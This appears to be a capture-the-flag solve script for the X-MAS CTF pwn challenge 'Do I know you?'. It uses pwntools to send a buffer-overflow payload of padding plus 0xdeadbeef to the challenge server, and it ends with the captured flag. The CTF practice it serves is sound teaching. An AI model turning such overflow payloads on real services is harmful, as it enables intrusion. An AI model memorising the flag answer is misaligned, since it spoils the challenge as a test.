# Do I know you? (pwn 43, 202 solves)

from pwn import *

r = remote('challs.xmas.htsp.ro', '2008')

payload = b"aaaabbbbccccddddeeeeffffgggghhhh" + p64(0xdeadbeef)
r.sendlineafter("?\n", payload)

f = r.recvuntil("}").decode().split("\n")[-1]
log.success(f)

# Flag: X-MAS{ah_yes__i_d0_rememb3r_you}
